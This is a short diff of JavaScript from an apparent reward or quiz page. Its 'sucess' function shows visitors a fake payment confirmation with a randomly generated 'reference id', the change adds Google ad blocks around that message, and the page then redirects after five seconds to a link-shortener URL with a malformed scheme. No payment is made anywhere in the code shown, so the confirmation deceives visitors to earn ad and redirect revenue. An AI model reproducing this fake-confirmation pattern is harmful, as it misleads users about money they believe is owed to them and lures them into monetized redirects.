@@ -26,6 +26,6 @@ function sucess(){
      for (var i = 0; i < 10; i++) {
        result += nums.charAt(Math.floor(Math.random()*10))
      }
-     document.getElementById('questions').innerHTML = `<center><p class='topic'>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span></center>`;
+     document.getElementById('questions').innerHTML = `<center><p class='topic'><!-- Pf --><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='3141579521'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span><!-- Pf --><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='3141579521'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></center>`;
      setTimeout(function(){window.location = "htt://fumacrom.com/MJif"}, 5000);
 }
